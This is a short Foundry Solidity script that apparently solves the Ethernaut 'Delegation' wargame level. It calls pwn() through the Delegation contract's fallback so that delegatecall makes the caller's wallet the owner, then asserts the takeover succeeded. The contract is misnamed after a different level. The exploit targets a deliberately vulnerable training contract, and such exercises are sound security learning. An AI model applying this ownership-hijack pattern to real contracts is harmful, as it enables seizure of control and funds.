// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { Delegation, Delegate } from "ethernaut/L5.delegation.sol";

contract FalloutCrackerScript is Script {
  function run() external {
    Delegation delegation = Delegation(vm.envAddress("ETHERNAUT_DELEGATION_ADDRESS"));
    address wallet = vm.envAddress("WALLET_ADDRESS");

    vm.broadcast(wallet);
    Delegate(address(delegation)).pwn();

    assert(delegation.owner() == wallet);
  }
}
